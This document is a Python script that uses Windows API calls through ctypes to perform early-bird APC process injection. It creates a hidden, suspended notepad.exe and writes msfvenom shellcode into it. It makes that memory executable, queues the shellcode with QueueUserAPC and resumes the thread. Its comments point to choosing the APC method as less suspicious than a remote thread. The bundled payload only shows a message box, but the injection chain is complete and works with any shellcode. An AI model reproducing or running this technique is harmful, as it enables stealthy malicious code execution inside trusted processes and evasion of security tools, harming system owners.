from ctypes import *
from ctypes import wintypes
import subprocess


kernel32 = windll.kernel32
SIZE_T = c_size_t
LPSTR  = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)

# VirtualAllocEx is used to allocate memory in another processes
VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD,  wintypes.DWORD)
VirtualAllocEx.restype= wintypes.LPVOID

#The WriteProcessMemory function is used to write data to the memory of a specified process
WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

#defining the seurity attribute o utilize the pointer for the remotethread
class _SECURITY_ATTRIBUTES_(Structure):
	_fields_=[("nLength",wintypes.DWORD),
			  ("lpsecurityDescriptor", wintypes.LPVOID),
			  ("nInheritHandle", wintypes.BOOL)]

SECURITY_ATTRIBUTES	= _SECURITY_ATTRIBUTES_
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES_)	  
LPTHREAD_START_ROUTINE= wintypes.LPVOID

#CreateRemoteThread is used for creating the thread which runs in the virtual addr of the another process
CreateRemoteThread= kernel32.CreateRemoteThread
CreateRemoteThread.argtypes= (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPWORD )
CreateRemoteThread.restype= wintypes.HANDLE

#defining some constants for the mmory
MEM_COMMIT     = 0x00001000  # this allocates a memory for virtual space
MEM_RESERVE	   = 0x00002000  # this is reserving the memory for virtual space without actually allocating
PAGE_READWRITE = 0x04	     # access for reading and writing in the allocated virtual spce		
EXECUTE_IMMEDIATELY = 0x00
PROCESS_ALL_ACCESS = 0x001F0FFF  #to give all access to the process

#VirtualProtectEx is a function in the Windows API used for modifying the protection on a region of committed pages in the virtual address space of a specified process
VirtualProtectEx = kernel32.VirtualProtectEx
VirtualProtectEx.argtypes=(wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.LPDWORD)
VirtualProtectEx.restype=wintypes.BOOL

#the STARTUPINFO structure in the Windows API is used to specify the window station, desktop, standard handles, and appearance of a new process when it's created
class STARTUPINFO(Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPSTR),
        ("lpDesktop", wintypes.LPSTR),
        ("lpTitle", wintypes.LPSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),  # Typically a 16-bit value
        ("cbReserved2", wintypes.WORD), # Size in bytes of the reserved area
        ("lpReserved2",POINTER(c_ubyte)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE)
    ]

#PROCESS_INFORMATION structure is used to get the info of the created process and its primary thread
class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD)
    ]

#Creates a new process and its primary thread. The new process runs in the security context of the calling process.
CreateProcessA =  kernel32.CreateProcessA
CreateProcessA.argtypes = (wintypes.LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION))
CreateProcessA.restype= wintypes.BOOL

#msfvenom -a x64 windows/x64/messagebox TITLE=hello TEXT=world -f py  => shellcode generated from kali
buf =  b""
buf += b"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00"
buf += b"\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65"
buf += b"\x48\x8b\x52\x60\x3e\x48\x8b\x52\x18\x3e\x48\x8b"
buf += b"\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48\x0f\xb7\x4a"
buf += b"\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
buf += b"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += b"\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
buf += b"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
buf += b"\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
buf += b"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31"
buf += b"\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75"
buf += b"\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd6"
buf += b"\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
buf += b"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
buf += b"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e"
buf += b"\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20"
buf += b"\x41\x52\xff\xe0\x58\x41\x59\x5a\x3e\x48\x8b\x12"
buf += b"\xe9\x49\xff\xff\xff\x5d\x3e\x48\x8d\x8d\x1a\x01"
buf += b"\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5\x49\xc7"
buf += b"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
buf += b"\x00\x3e\x4c\x8d\x85\x14\x01\x00\x00\x48\x31\xc9"
buf += b"\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41"
buf += b"\xba\xf0\xb5\xa2\x56\xff\xd5\x77\x6f\x72\x6c\x64"
buf += b"\x00\x68\x65\x6c\x6c\x6f\x00\x75\x73\x65\x72\x33"
buf += b"\x32\x2e\x64\x6c\x6c\x00"


def verify(x):
	if not x:
		raise WinError()


startup_info = STARTUPINFO()
startup_info.cb = sizeof(startup_info)
startup_info.dwFlags = 1 # utilizing the api STARTF_USESHOWWINDOW
startup_info.wShowWindow = 1 #to create the window as a normal window

process_info = PROCESS_INFORMATION()

CREATE_NEW_CONSOLE = 0x00000010  #process runs through a console
CREATE_NO_WINDOW   = 0x08000000  #process runniing without a console window
CREATE_SUSPENDED   = 0x00000004  # the primary thread of the new process is created in a suspended state

#creating an hidden process
created = CreateProcessA(b"C:\\Windows\\System32\\notepad.exe", None, None, None, False, CREATE_NO_WINDOW | CREATE_SUSPENDED, None, None, byref(startup_info), byref(process_info))

if not created:
    raise WinError()

verify(created)    

pid = process_info.dwProcessId
h_Thread = process_info.hThread
Thread_Id = process_info.dwThreadId
h_Process = process_info.hProcess

print("Started the process => Handle:{}, PID:{}, TID:{}".format(h_Process, pid, Thread_Id))

#allocating the virtual memory
remote_memory = VirtualAllocEx(h_Process, False, len(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
verify(remote_memory)
print("Memory Allocated => ",hex(remote_memory))

#writing in the remote memory
write = WriteProcessMemory(h_Process, remote_memory, buf, len(buf), None)
verify(write)
print("the bytes written => {}".format(len(buf)))

PAGE_EXECUTE_READ = 0x20
old_Protection = wintypes.DWORD()

#changing the protectionn condition in the virtual memory
protect = VirtualProtectEx(h_Process, remote_memory, len(buf), PAGE_EXECUTE_READ, byref(old_Protection))
verify(protect)
print("Memory protection updated from the {} to {}".format(old_Protection.value, PAGE_EXECUTE_READ))

#we need to execute this shellcode
# rThread = CreateRemoteThread(h_Process,None,0, remote_memory,None,EXECUTE_IMMEDIATELY,None)
# verify(rThread)

PAPCFUNC = CFUNCTYPE(None, POINTER(wintypes.ULONG))

#this is a asynchronous procedure call function like remote thread less suspicious
QueueUserAPC = kernel32.QueueUserAPC
QueueUserAPC.argtypes=(PAPCFUNC, wintypes.HANDLE, POINTER(wintypes.ULONG))
QueueUserAPC.restype = wintypes.BOOL

#to resume the previous suspended thread
ResumeThread = kernel32.ResumeThread
ResumeThread.argtypes=(wintypes.HANDLE,)
ResumeThread.restype = wintypes.BOOL


# to load the shell in thread in the remote memory
rqueue = QueueUserAPC(PAPCFUNC(remote_memory), h_Thread, None)
if not rqueue:
    raise WinError()
verify(rqueue)
print("Queueing APC thread => {}".format(h_Thread))

#now we have to resume
rThread = ResumeThread(h_Thread)
verify(rThread)
print("Resuming the Thread!!")

